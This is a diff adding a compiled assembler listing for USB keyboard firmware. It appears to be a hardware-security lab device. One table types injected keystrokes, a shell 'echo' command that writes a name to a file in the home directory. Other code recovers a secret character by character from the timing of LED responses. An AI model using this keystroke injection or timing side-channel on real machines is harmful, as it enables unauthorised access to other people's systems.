+  54:main.c        ****     {GERMAN_KEYBOARD_SC_A, 0},
+  55:main.c        ****     {GERMAN_KEYBOARD_SC_B, 0},
+  56:main.c        ****     {GERMAN_KEYBOARD_SC_C, 0},
+  57:main.c        ****     {GERMAN_KEYBOARD_SC_D, 0},
+  58:main.c        ****     {GERMAN_KEYBOARD_SC_E, 0},
+  59:main.c        ****     {GERMAN_KEYBOARD_SC_F, 0},
+  60:main.c        ****     {GERMAN_KEYBOARD_SC_G, 0},
+  61:main.c        ****     {GERMAN_KEYBOARD_SC_H, 0},
+  62:main.c        ****     {GERMAN_KEYBOARD_SC_I, 0},
+  63:main.c        ****     {GERMAN_KEYBOARD_SC_J, 0},
+  64:main.c        ****     {GERMAN_KEYBOARD_SC_K, 0},
+  65:main.c        ****     {GERMAN_KEYBOARD_SC_L, 0},
+  66:main.c        ****     {GERMAN_KEYBOARD_SC_M, 0},
+  67:main.c        ****     {GERMAN_KEYBOARD_SC_N, 0},
+  68:main.c        ****     {GERMAN_KEYBOARD_SC_O, 0},
+  69:main.c        ****     {GERMAN_KEYBOARD_SC_P, 0},
+  70:main.c        ****     {GERMAN_KEYBOARD_SC_Q, 0},
+  71:main.c        ****     {GERMAN_KEYBOARD_SC_R, 0},
+  72:main.c        ****     {GERMAN_KEYBOARD_SC_S, 0},
+  73:main.c        ****     {GERMAN_KEYBOARD_SC_T, 0},
+  74:main.c        ****     {GERMAN_KEYBOARD_SC_U, 0},
+  75:main.c        ****     {GERMAN_KEYBOARD_SC_V, 0},
+  76:main.c        ****     {GERMAN_KEYBOARD_SC_W, 0},
+  77:main.c        ****     {GERMAN_KEYBOARD_SC_X, 0},
+  78:main.c        ****     {GERMAN_KEYBOARD_SC_Y, 0},
+  79:main.c        ****     {GERMAN_KEYBOARD_SC_Z, 0},
+  80:main.c        ****     {GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION, 0},
+  81:main.c        ****     {GERMAN_KEYBOARD_SC_2_AND_QUOTES, 0},
+  82:main.c        ****     {GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH, 0},
+  83:main.c        ****     {GERMAN_KEYBOARD_SC_4_AND_DOLLAR, 0},
+  84:main.c        ****     {GERMAN_KEYBOARD_SC_5_AND_PERCENTAGE, 0},
+  85:main.c        ****     {GERMAN_KEYBOARD_SC_6_AND_AMPERSAND, 0},
+  86:main.c        ****     {GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE, 0},
+  87:main.c        ****     {GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET, 0},
+  88:main.c        ****     {GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET, 0},
+  89:main.c        ****     {GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE, 0},
+  90:main.c        ****     {GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE, 0},
+  91:main.c        ****     {GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE, 0},
+  92:main.c        ****     {GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON, 0},
+  93:main.c        ****     {GERMAN_KEYBOARD_SC_DOT_AND_COLON, 0},
+  94:main.c        ****     {GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE, 0},
+  95:main.c        ****     {GERMAN_KEYBOARD_SC_SHARP_S_AND_QUESTION_AND_BACKSLASH, 0},
+  96:main.c        ****     {GERMAN_KEYBOARD_SC_A, 1},// Shift keys (mod = 1)
+  97:main.c        ****     {GERMAN_KEYBOARD_SC_B, 1},
+  98:main.c        ****     {GERMAN_KEYBOARD_SC_C, 1},
+  99:main.c        ****     {GERMAN_KEYBOARD_SC_D, 1},
+ 100:main.c        ****     {GERMAN_KEYBOARD_SC_E, 1},
+ 101:main.c        ****     {GERMAN_KEYBOARD_SC_F, 1},
+ 102:main.c        ****     {GERMAN_KEYBOARD_SC_G, 1},
+ 103:main.c        ****     {GERMAN_KEYBOARD_SC_H, 1},
+ 104:main.c        ****     {GERMAN_KEYBOARD_SC_I, 1},
+ 105:main.c        ****     {GERMAN_KEYBOARD_SC_J, 1},
+ 106:main.c        ****     {GERMAN_KEYBOARD_SC_K, 1},
+ 107:main.c        ****     {GERMAN_KEYBOARD_SC_L, 1},
+ 108:main.c        ****     {GERMAN_KEYBOARD_SC_M, 1},
+ 109:main.c        ****     {GERMAN_KEYBOARD_SC_N, 1},
+ 110:main.c        ****     {GERMAN_KEYBOARD_SC_O, 1},
+ 111:main.c        ****     {GERMAN_KEYBOARD_SC_P, 1},
+ 112:main.c        ****     {GERMAN_KEYBOARD_SC_Q, 1},
+ 113:main.c        ****     {GERMAN_KEYBOARD_SC_R, 1},
+ 114:main.c        ****     {GERMAN_KEYBOARD_SC_S, 1},
+ 115:main.c        ****     {GERMAN_KEYBOARD_SC_T, 1},
+ 116:main.c        ****     {GERMAN_KEYBOARD_SC_U, 1},
+ 117:main.c        ****     {GERMAN_KEYBOARD_SC_V, 1},
+ 118:main.c        ****     {GERMAN_KEYBOARD_SC_W, 1},
+ 119:main.c        ****     {GERMAN_KEYBOARD_SC_X, 1},
+ 120:main.c        ****     {GERMAN_KEYBOARD_SC_Y, 1},
+ 121:main.c        ****     {GERMAN_KEYBOARD_SC_Z, 1},
+ 122:main.c        ****     {GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION, 1},
+ 123:main.c        ****     {GERMAN_KEYBOARD_SC_2_AND_QUOTES, 1},
+ 124:main.c        ****     {GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH, 1},
+ 125:main.c        ****     {GERMAN_KEYBOARD_SC_4_AND_DOLLAR, 1},
+ 126:main.c        ****     {GERMAN_KEYBOARD_SC_5_AND_PERCENTAGE, 1},
+ 127:main.c        ****     {GERMAN_KEYBOARD_SC_6_AND_AMPERSAND, 1},
+ 128:main.c        ****     {GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE, 1},
+ 129:main.c        ****     {GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET, 1},
+ 130:main.c        ****     {GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET, 1},
+ 131:main.c        ****     {GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE, 1},
+ 132:main.c        ****     {GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE, 1},
+ 133:main.c        ****     {GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE, 1},
+ 134:main.c        ****     {GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON, 1},
+ 135:main.c        ****     {GERMAN_KEYBOARD_SC_DOT_AND_COLON, 1},
+ 136:main.c        ****     {GERMAN_KEYBOARD_SC_SHARP_S_AND_QUESTION_AND_BACKSLASH, 1},
+ 137:main.c        ****     {GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE, 1},
+ 138:main.c        ****     {GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE, 2},// AltGr keys (mod = 2)
+ 139:main.c        ****     {GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET, 2},
+ 140:main.c        ****     {GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET, 2},
+ 141:main.c        ****     {GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE, 2},
+ 142:main.c        ****     {GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE, 2},
+ 143:main.c        ****     {GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE, 2},
+ 144:main.c        ****     {GERMAN_KEYBOARD_SC_SHARP_S_AND_QUESTION_AND_BACKSLASH, 2}
+ 145:main.c        **** 
+ 146:main.c        **** };
+ 147:main.c        **** 
+ 148:main.c        **** Keydata solutionLut [50]= {
+ 149:main.c        ****     // Normal keys (mod = 0)
+ 150:main.c        ****     {GERMAN_KEYBOARD_SC_V, 0},
+ 151:main.c        ****     {GERMAN_KEYBOARD_SC_G, 0},
+ 152:main.c        ****     {GERMAN_KEYBOARD_SC_D, 0}
+ 153:main.c        **** };
+ 154:main.c        **** 
+ 155:main.c        **** Keydata string2sendLut [50]= {
+ 156:main.c        ****     // Normal keys (mod = 0)
+ 157:main.c        ****     {GERMAN_KEYBOARD_SC_A, 0},
+ 158:main.c        ****     {GERMAN_KEYBOARD_SC_ENTER, 0}
+ 159:main.c        **** };
+ 160:main.c        **** 
+ 161:main.c        **** Keydata trojanInstuctionsLut []= { //echo "echo "Milo Valle" > $HOME/03813253
+ 162:main.c        ****     // Normal keys (mod = 0)
+ 163:main.c        ****     {HID_KEYBOARD_SC_CAPS_LOCK, 0},
+ 164:main.c        ****     {GERMAN_KEYBOARD_SC_E, 0},
+ 165:main.c        ****     {GERMAN_KEYBOARD_SC_C, 0},
+ 166:main.c        ****     {GERMAN_KEYBOARD_SC_H, 0},
+ 167:main.c        ****     {GERMAN_KEYBOARD_SC_O, 0},
+ 168:main.c        ****     {GERMAN_KEYBOARD_SC_SPACE, 0},
+ 169:main.c        **** 
+ 170:main.c        ****     {GERMAN_KEYBOARD_SC_2_AND_QUOTES, 1},
+ 171:main.c        ****     {GERMAN_KEYBOARD_SC_M, 1},
+ 172:main.c        ****     {GERMAN_KEYBOARD_SC_I, 0},
+ 173:main.c        ****     {GERMAN_KEYBOARD_SC_L, 0},
+ 174:main.c        ****     {GERMAN_KEYBOARD_SC_O, 0},
+ 175:main.c        ****     {GERMAN_KEYBOARD_SC_SPACE, 0},
+ 176:main.c        ****     {GERMAN_KEYBOARD_SC_V, 1},
+ 177:main.c        ****     {GERMAN_KEYBOARD_SC_A, 0},
+ 178:main.c        ****     {GERMAN_KEYBOARD_SC_L, 0},
+ 179:main.c        ****     {GERMAN_KEYBOARD_SC_L, 0},
+ 180:main.c        ****     {GERMAN_KEYBOARD_SC_E, 0},
+ 181:main.c        ****     {GERMAN_KEYBOARD_SC_2_AND_QUOTES, 1},
+ 182:main.c        ****     {GERMAN_KEYBOARD_SC_SPACE, 0},
+ 183:main.c        **** 
+ 184:main.c        ****     {GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE, 1},
+ 185:main.c        ****     {GERMAN_KEYBOARD_SC_SPACE, 0},
+ 186:main.c        **** 
+ 187:main.c        ****     {GERMAN_KEYBOARD_SC_4_AND_DOLLAR, 1},
+ 188:main.c        ****     {GERMAN_KEYBOARD_SC_H, 1},
+ 189:main.c        ****     {GERMAN_KEYBOARD_SC_O, 1},
+ 190:main.c        ****     {GERMAN_KEYBOARD_SC_M, 1},
+ 191:main.c        ****     {GERMAN_KEYBOARD_SC_E, 1},
+ 192:main.c        ****     {GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE, 1},
+ 193:main.c        ****     {GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE, 0},
+ 194:main.c        ****     {GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH, 0},
+ 195:main.c        ****     {GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET, 0},
+ 196:main.c        ****     {GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION, 0},
+ 197:main.c        ****     {GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH, 0},
+ 198:main.c        ****     {GERMAN_KEYBOARD_SC_2_AND_QUOTES, 0},
+ 199:main.c        ****     {GERMAN_KEYBOARD_SC_5_AND_PERCENTAGE, 0},
+ 200:main.c        ****     {GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH, 0},
+ 201:main.c        ****     {GERMAN_KEYBOARD_SC_ENTER, 0},
+ 202:main.c        **** };
+ 203:main.c        **** 
+ 204:main.c        **** // void SysTick_Handler(void) {
+ 205:main.c        **** //     msTicks++;
+ 206:main.c        **** // }
+ 207:main.c        **** 
+ 208:main.c        **** // Helper to get current time
+ 209:main.c        **** // uint32_t GetTick(void) {
+ 210:main.c        **** //     return msTicks;
+ 211:main.c        **** // }
+ 212:main.c        **** 
+ 213:main.c        **** // Insert for Keydata arrays (shifts structs)
+ 214:main.c        **** void insertKeydata(Keydata arr[], int *size, int index, Keydata value) {
+ 540              		.loc 2 214 72
+ 541              		.cfi_startproc
+ 542              		@ args = 0, pretend = 0, frame = 24
+ 543              		@ frame_needed = 1, uses_anonymous_args = 0
+ 544              		@ link register save eliminated.
+ 545 0000 80B4     		push	{r7}
+ 546              	.LCFI12:
+ 547              		.cfi_def_cfa_offset 4
+ 548              		.cfi_offset 7, -4
+ 549 0002 87B0     		sub	sp, sp, #28
+ 550              	.LCFI13:
+ 551              		.cfi_def_cfa_offset 32
+ 552 0004 00AF     		add	r7, sp, #0
+ 553              	.LCFI14:
+ 554              		.cfi_def_cfa_register 7
+ 555 0006 F860     		str	r0, [r7, #12]
+ 556 0008 B960     		str	r1, [r7, #8]
+ 557 000a 7A60     		str	r2, [r7, #4]
+ 558 000c 3B80     		strh	r3, [r7]	@ movhi
+ 559              	.LBB2:
+ 215:main.c        ****     for (int i = *size; i > index; --i) {
+ 560              		.loc 2 215 14
+ 561 000e BB68     		ldr	r3, [r7, #8]
+ 562 0010 1B68     		ldr	r3, [r3]
+ 563 0012 7B61     		str	r3, [r7, #20]
+ 564              		.loc 2 215 5
+ 565 0014 11E0     		b	.L4
+ 566              	.L5:
+ 216:main.c        ****         arr[i] = arr[i - 1];
+ 567              		.loc 2 216 21 discriminator 3
+ 568 0016 7B69     		ldr	r3, [r7, #20]
+ 569 0018 03F10043 		add	r3, r3, #-2147483648
+ 570 001c 013B     		subs	r3, r3, #1
+ 571 001e 5B00     		lsls	r3, r3, #1
+ 572 0020 FA68     		ldr	r2, [r7, #12]
+ 573 0022 D118     		adds	r1, r2, r3
+ 574              		.loc 2 216 12 discriminator 3
+ 575 0024 7B69     		ldr	r3, [r7, #20]
+ 576 0026 5B00     		lsls	r3, r3, #1
+ 577 0028 FA68     		ldr	r2, [r7, #12]
+ 578 002a 1344     		add	r3, r3, r2
+ 579              		.loc 2 216 16 discriminator 3
+ 580 002c 1A46     		mov	r2, r3
+ 581 002e 0B46     		mov	r3, r1
+ 582 0030 1B88     		ldrh	r3, [r3]	@ unaligned
+ 583 0032 1380     		strh	r3, [r2]	@ unaligned
+ 215:main.c        ****     for (int i = *size; i > index; --i) {
+ 584              		.loc 2 215 36 discriminator 3
+ 585 0034 7B69     		ldr	r3, [r7, #20]
+ 586 0036 013B     		subs	r3, r3, #1
+ 587 0038 7B61     		str	r3, [r7, #20]
+ 588              	.L4:
+ 215:main.c        ****     for (int i = *size; i > index; --i) {
+ 589              		.loc 2 215 5 discriminator 1
+ 590 003a 7A69     		ldr	r2, [r7, #20]
+ 591 003c 7B68     		ldr	r3, [r7, #4]
+ 592 003e 9A42     		cmp	r2, r3
+ 593 0040 E9DC     		bgt	.L5
+ 594              	.LBE2:
+ 217:main.c        ****     }
+ 218:main.c        ****     arr[index] = value;
+ 595              		.loc 2 218 8
+ 596 0042 7B68     		ldr	r3, [r7, #4]
+ 597 0044 5B00     		lsls	r3, r3, #1
+ 598 0046 FA68     		ldr	r2, [r7, #12]
+ 599 0048 1344     		add	r3, r3, r2
+ 600              		.loc 2 218 16
+ 601 004a 1A46     		mov	r2, r3
+ 602 004c 3B46     		mov	r3, r7
+ 603 004e 1B88     		ldrh	r3, [r3]	@ unaligned
+ 604 0050 1380     		strh	r3, [r2]	@ unaligned
+ 219:main.c        ****     (*size)++;
+ 605              		.loc 2 219 6
+ 606 0052 BB68     		ldr	r3, [r7, #8]
+ 607 0054 1B68     		ldr	r3, [r3]
+ 608              		.loc 2 219 12
+ 609 0056 5A1C     		adds	r2, r3, #1
+ 610 0058 BB68     		ldr	r3, [r7, #8]
+ 611 005a 1A60     		str	r2, [r3]
+ 220:main.c        **** }
+ 612              		.loc 2 220 1
+ 613 005c 00BF     		nop
+ 614 005e 1C37     		adds	r7, r7, #28
+ 615              	.LCFI15:
+ 616              		.cfi_def_cfa_offset 4
+ 617 0060 BD46     		mov	sp, r7
+ 618              	.LCFI16:
+ 619              		.cfi_def_cfa_register 13
+ 620              		@ sp needed
+ 621 0062 5DF8047B 		ldr	r7, [sp], #4
+ 622              	.LCFI17:
+ 623              		.cfi_restore 7
+ 624              		.cfi_def_cfa_offset 0
+ 625 0066 7047     		bx	lr
+ 626              		.cfi_endproc
+ 627              	.LFE203:
+ 629              		.section	.text.MeasureLedToggleDistance,"ax",%progbits
+ 630              		.align	1
+ 631              		.global	MeasureLedToggleDistance
+ 632              		.syntax unified
+ 633              		.thumb
+ 634              		.thumb_func
+ 636              	MeasureLedToggleDistance:
+ 637              	.LFB204:
+ 221:main.c        **** 
+ 222:main.c        **** 
+ 223:main.c        **** void MeasureLedToggleDistance(void) {
+ 638              		.loc 2 223 37
+ 639              		.cfi_startproc
+ 640              		@ args = 0, pretend = 0, frame = 0
+ 641              		@ frame_needed = 1, uses_anonymous_args = 0
+ 642              		@ link register save eliminated.
+ 643 0000 80B4     		push	{r7}
+ 644              	.LCFI18:
+ 645              		.cfi_def_cfa_offset 4
+ 646              		.cfi_offset 7, -4
+ 647 0002 00AF     		add	r7, sp, #0
+ 648              	.LCFI19:
+ 649              		.cfi_def_cfa_register 7
+ 224:main.c        ****         //public_distance = GetTick() - startTime; 
+ 225:main.c        ****         public_distance = DWT -> CYCCNT - startTime;
+ 650              		.loc 2 225 31
+ 651 0004 194B     		ldr	r3, .L9
+ 652 0006 5B68     		ldr	r3, [r3, #4]
+ 653              		.loc 2 225 41
+ 654 0008 194A     		ldr	r2, .L9+4
+ 655 000a 1268     		ldr	r2, [r2]
+ 656 000c 9B1A     		subs	r3, r3, r2
+ 657              		.loc 2 225 25
+ 658 000e 194A     		ldr	r2, .L9+8
+ 659 0010 1360     		str	r3, [r2]
+ 226:main.c        ****         if (msgiterator > 0 && public_distance > maxtime) {
+ 660              		.loc 2 226 25
+ 661 0012 194B     		ldr	r3, .L9+12
+ 662 0014 1B68     		ldr	r3, [r3]
+ 663              		.loc 2 226 12
+ 664 0016 002B     		cmp	r3, #0
+ 665 0018 23DD     		ble	.L8
+ 666              		.loc 2 226 48 discriminator 1
+ 667 001a 164B     		ldr	r3, .L9+8
+ 668 001c 1B68     		ldr	r3, [r3]
+ 669 001e 174A     		ldr	r2, .L9+16
+ 670 0020 1268     		ldr	r2, [r2]
+ 671              		.loc 2 226 29 discriminator 1
+ 672 0022 9342     		cmp	r3, r2
+ 673 0024 1DD9     		bls	.L8
+ 227:main.c        ****             maxtime = public_distance;
+ 674              		.loc 2 227 21
+ 675 0026 134B     		ldr	r3, .L9+8
+ 676 0028 1B68     		ldr	r3, [r3]
+ 677 002a 1A46     		mov	r2, r3
+ 678 002c 134B     		ldr	r3, .L9+16
+ 679 002e 1A60     		str	r2, [r3]
+ 228:main.c        ****             solutionLut[solutionlen].Key = keyLut[msgiterator - 1].Key;
+ 680              		.loc 2 228 63
+ 681 0030 114B     		ldr	r3, .L9+12
+ 682 0032 1B68     		ldr	r3, [r3]
+ 683 0034 5A1E     		subs	r2, r3, #1
+ 684              		.loc 2 228 37
+ 685 0036 124B     		ldr	r3, .L9+20
+ 686 0038 1B68     		ldr	r3, [r3]
+ 687              		.loc 2 228 67
+ 688 003a 1249     		ldr	r1, .L9+24
+ 689 003c 11F81210 		ldrb	r1, [r1, r2, lsl #1]	@ zero_extendqisi2
+ 690              		.loc 2 228 42
+ 691 0040 114A     		ldr	r2, .L9+28
+ 692 0042 02F81310 		strb	r1, [r2, r3, lsl #1]
+ 229:main.c        ****             solutionLut[solutionlen].Mod = keyLut[msgiterator - 1].Mod;
+ 693              		.loc 2 229 63
+ 694 0046 0C4B     		ldr	r3, .L9+12
+ 695 0048 1B68     		ldr	r3, [r3]
+ 696 004a 013B     		subs	r3, r3, #1
+ 697              		.loc 2 229 37
+ 698 004c 0C4A     		ldr	r2, .L9+20
+ 699 004e 1268     		ldr	r2, [r2]
+ 700              		.loc 2 229 67
+ 701 0050 0C49     		ldr	r1, .L9+24
+ 702 0052 5B00     		lsls	r3, r3, #1
+ 703 0054 0B44     		add	r3, r3, r1
+ 704 0056 5878     		ldrb	r0, [r3, #1]	@ zero_extendqisi2
+ 705              		.loc 2 229 42
+ 706 0058 0B49     		ldr	r1, .L9+28
+ 707 005a 5300     		lsls	r3, r2, #1
+ 708 005c 0B44     		add	r3, r3, r1
+ 709 005e 0246     		mov	r2, r0
+ 710 0060 5A70     		strb	r2, [r3, #1]
+ 711              	.L8:
+ 230:main.c        ****         }
+ 231:main.c        **** }
+ 712              		.loc 2 231 1
+ 713 0062 00BF     		nop
+ 714 0064 BD46     		mov	sp, r7
+ 715              	.LCFI20:
+ 716              		.cfi_def_cfa_register 13
+ 717              		@ sp needed
+ 718 0066 5DF8047B 		ldr	r7, [sp], #4
+ 719              	.LCFI21:
+ 720              		.cfi_restore 7
+ 721              		.cfi_def_cfa_offset 0
+ 722 006a 7047     		bx	lr
+ 723              	.L10:
+ 724              		.align	2
+ 725              	.L9:
+ 726 006c 001000E0 		.word	-536866816
+ 727 0070 00000000 		.word	startTime
+ 728 0074 00000000 		.word	public_distance
+ 729 0078 00000000 		.word	msgiterator
+ 730 007c 00000000 		.word	maxtime
+ 731 0080 00000000 		.word	solutionlen
+ 732 0084 00000000 		.word	keyLut
+ 733 0088 00000000 		.word	solutionLut
+ 734              		.cfi_endproc
+ 735              	.LFE204:
+ 737              		.section	.text.bufferlogic,"ax",%progbits
+ 738              		.align	1
+ 739              		.global	bufferlogic
+ 740              		.syntax unified
+ 741              		.thumb
+ 742              		.thumb_func
+ 744              	bufferlogic:
+ 745              	.LFB205:
+ 232:main.c        **** 
+ 233:main.c        **** 
+ 234:main.c        **** void bufferlogic(void) {
+ 746              		.loc 2 234 24
+ 747              		.cfi_startproc
+ 748              		@ args = 0, pretend = 0, frame = 8
+ 749              		@ frame_needed = 1, uses_anonymous_args = 0
+ 750 0000 80B5     		push	{r7, lr}
+ 751              	.LCFI22:
+ 752              		.cfi_def_cfa_offset 8
+ 753              		.cfi_offset 7, -8
+ 754              		.cfi_offset 14, -4
+ 755 0002 82B0     		sub	sp, sp, #8
+ 756              	.LCFI23:
+ 757              		.cfi_def_cfa_offset 16
+ 758 0004 00AF     		add	r7, sp, #0
+ 759              	.LCFI24:
+ 760              		.cfi_def_cfa_register 7
+ 235:main.c        **** 
+ 236:main.c        ****         string2sendLut[current_string_length - 1] = keyLut[msgiterator]; //fill the buffer with the
+ 761              		.loc 2 236 59
+ 762 0006 294B     		ldr	r3, .L13
+ 763 0008 1A68     		ldr	r2, [r3]
+ 764              		.loc 2 236 46
+ 765 000a 294B     		ldr	r3, .L13+4
+ 766 000c 1B68     		ldr	r3, [r3]
+ 767 000e 013B     		subs	r3, r3, #1
+ 768              		.loc 2 236 51
+ 769 0010 2849     		ldr	r1, .L13+8
+ 770 0012 2948     		ldr	r0, .L13+12
+ 771 0014 30F81220 		ldrh	r2, [r0, r2, lsl #1]	@ movhi
+ 772 0018 21F81320 		strh	r2, [r1, r3, lsl #1]	@ movhi
+ 237:main.c        ****         string2sendLut[current_string_length] = (Keydata){GERMAN_KEYBOARD_SC_ENTER, 0}; //append en
+ 773              		.loc 2 237 23
+ 774 001c 244B     		ldr	r3, .L13+4
+ 775 001e 1B68     		ldr	r3, [r3]
+ 776              		.loc 2 237 47
+ 777 0020 244A     		ldr	r2, .L13+8
+ 778 0022 2821     		movs	r1, #40
+ 779 0024 02F81310 		strb	r1, [r2, r3, lsl #1]
+ 780 0028 224A     		ldr	r2, .L13+8
+ 781 002a 5B00     		lsls	r3, r3, #1
+ 782 002c 1344     		add	r3, r3, r2
+ 783 002e 0022     		movs	r2, #0
+ 784 0030 5A70     		strb	r2, [r3, #1]
+ 238:main.c        ****     
+ 239:main.c        ****         msgiterator++;
+ 785              		.loc 2 239 20
+ 786 0032 1E4B     		ldr	r3, .L13
+ 787 0034 1B68     		ldr	r3, [r3]
+ 788 0036 0133     		adds	r3, r3, #1
+ 789 0038 1C4A     		ldr	r2, .L13
+ 790 003a 1360     		str	r3, [r2]
+ 240:main.c        ****     
+ 241:main.c        ****             if (msgiterator >= msg_len) {
+ 791              		.loc 2 241 29
+ 792 003c 1B4B     		ldr	r3, .L13
+ 793 003e 1B68     		ldr	r3, [r3]
+ 794              		.loc 2 241 16
+ 795 0040 5B2B     		cmp	r3, #91
+ 796 0042 2CDD     		ble	.L12
+ 797              	.LBB3:
+ 242:main.c        ****             
+ 243:main.c        ****                 insertKeydata(string2sendLut, &current_string_length, solution_paste_index, solutio
+ 798              		.loc 2 243 17
+ 799 0044 1D4B     		ldr	r3, .L13+16
+ 800 0046 1968     		ldr	r1, [r3]
+ 801 0048 1D4B     		ldr	r3, .L13+20
+ 802 004a 1B68     		ldr	r3, [r3]
+ 803 004c 1D4A     		ldr	r2, .L13+24
+ 804 004e 32F81320 		ldrh	r2, [r2, r3, lsl #1]
+ 805 0052 0023     		movs	r3, #0
+ 806 0054 62F30F03 		bfi	r3, r2, #0, #16
+ 807 0058 0A46     		mov	r2, r1
+ 808 005a 1549     		ldr	r1, .L13+4
+ 809 005c 1548     		ldr	r0, .L13+8
+ 810 005e FFF7FEFF 		bl	insertKeydata
+ 244:main.c        ****                 string2sendLut[current_string_length] = (Keydata){GERMAN_KEYBOARD_SC_ENTER, 0}; //a
+ 811              		.loc 2 244 31
+ 812 0062 134B     		ldr	r3, .L13+4
+ 813 0064 1B68     		ldr	r3, [r3]
+ 814              		.loc 2 244 55
+ 815 0066 134A     		ldr	r2, .L13+8
+ 816 0068 2821     		movs	r1, #40
+ 817 006a 02F81310 		strb	r1, [r2, r3, lsl #1]
+ 818 006e 114A     		ldr	r2, .L13+8
+ 819 0070 5B00     		lsls	r3, r3, #1
+ 820 0072 1344     		add	r3, r3, r2
+ 821 0074 0022     		movs	r2, #0
+ 822 0076 5A70     		strb	r2, [r3, #1]
+ 245:main.c        ****                 string_index = 0;
+ 823              		.loc 2 245 30
+ 824 0078 134B     		ldr	r3, .L13+28
+ 825 007a 0022     		movs	r2, #0
+ 826 007c 1A60     		str	r2, [r3]
+ 246:main.c        ****                 solutionlen++;
+ 827              		.loc 2 246 28
+ 828 007e 104B     		ldr	r3, .L13+20
+ 829 0080 1B68     		ldr	r3, [r3]
+ 830 0082 0133     		adds	r3, r3, #1
+ 831 0084 0E4A     		ldr	r2, .L13+20
+ 832 0086 1360     		str	r3, [r2]
+ 247:main.c        ****                 solution_paste_index++;
+ 833              		.loc 2 247 37
+ 834 0088 0C4B     		ldr	r3, .L13+16
+ 835 008a 1B68     		ldr	r3, [r3]
+ 836 008c 0133     		adds	r3, r3, #1
+ 837 008e 0B4A     		ldr	r2, .L13+16
+ 838 0090 1360     		str	r3, [r2]
+ 248:main.c        ****                 msgiterator = 0;
+ 839              		.loc 2 248 29
+ 840 0092 064B     		ldr	r3, .L13
+ 841 0094 0022     		movs	r2, #0
+ 842 0096 1A60     		str	r2, [r3]
+ 249:main.c        ****                 maxtime = 0;
+ 843              		.loc 2 249 25
+ 844 0098 0C4B     		ldr	r3, .L13+32
+ 845 009a 0022     		movs	r2, #0
+ 846 009c 1A60     		str	r2, [r3]
+ 847              	.L12:
+ 848              	.LBE3:
+ 250:main.c        ****             }  
+ 251:main.c        **** 
+ 252:main.c        **** 
+ 253:main.c        ****         string_index = 0; // Restart USB transmission
+ 849              		.loc 2 253 22
+ 850 009e 0A4B     		ldr	r3, .L13+28
+ 851 00a0 0022     		movs	r2, #0
+ 852 00a2 1A60     		str	r2, [r3]
+ 254:main.c        **** 
+ 255:main.c        **** 
+ 256:main.c        **** }
+ 853              		.loc 2 256 1
+ 854 00a4 00BF     		nop
+ 855 00a6 0837     		adds	r7, r7, #8
+ 856              	.LCFI25:
+ 857              		.cfi_def_cfa_offset 8
+ 858 00a8 BD46     		mov	sp, r7
+ 859              	.LCFI26:
+ 860              		.cfi_def_cfa_register 13
+ 861              		@ sp needed
+ 862 00aa 80BD     		pop	{r7, pc}
+ 863              	.L14:
+ 864              		.align	2
+ 865              	.L13:
+ 866 00ac 00000000 		.word	msgiterator
+ 867 00b0 00000000 		.word	current_string_length
+ 868 00b4 00000000 		.word	string2sendLut
+ 869 00b8 00000000 		.word	keyLut
+ 870 00bc 00000000 		.word	solution_paste_index
+ 871 00c0 00000000 		.word	solutionlen
+ 872 00c4 00000000 		.word	solutionLut
+ 873 00c8 00000000 		.word	string_index
+ 874 00cc 00000000 		.word	maxtime
+ 875              		.cfi_endproc
+ 876              	.LFE205:
+ 878              		.section	.text.ResetBufferLogic,"ax",%progbits
+ 879              		.align	1
+ 880              		.global	ResetBufferLogic
+ 881              		.syntax unified
+ 882              		.thumb
+ 883              		.thumb_func
+ 885              	ResetBufferLogic:
+ 886              	.LFB206:
+ 257:main.c        **** void ResetBufferLogic(void) {
+ 887              		.loc 2 257 29
+ 888              		.cfi_startproc
+ 889              		@ args = 0, pretend = 0, frame = 8
+ 890              		@ frame_needed = 1, uses_anonymous_args = 0
+ 891              		@ link register save eliminated.
+ 892 0000 80B4     		push	{r7}
+ 893              	.LCFI27:
+ 894              		.cfi_def_cfa_offset 4
+ 895              		.cfi_offset 7, -4
+ 896 0002 83B0     		sub	sp, sp, #12
+ 897              	.LCFI28:
+ 898              		.cfi_def_cfa_offset 16
+ 899 0004 00AF     		add	r7, sp, #0
+ 900              	.LCFI29:
+ 901              		.cfi_def_cfa_register 7
